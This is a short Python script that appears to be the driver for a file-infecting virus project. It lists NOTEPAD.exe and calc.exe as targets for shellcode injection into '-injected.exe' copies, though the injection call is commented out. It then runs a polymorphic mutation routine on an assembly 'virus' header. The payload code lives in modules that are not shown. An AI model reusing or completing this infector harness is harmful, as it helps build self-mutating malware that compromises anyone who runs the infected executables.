import pefile
import os
import Polymorphic
import pe_file

if __name__ == '__main__':
    file = [ 
        'NOTEPAD.exe',
        'calc.exe'
    ]

    for input_file in file:
        output_file = input_file.replace('.exe', '-injected.exe')
        print("\nInjecting ", input_file)
        print("\n")
        # injected_shell_code(input_file, output_file)

    virus = Polymorphic.SimplePoly(f"./src_asm/header.asm")
    virus.polymorphic()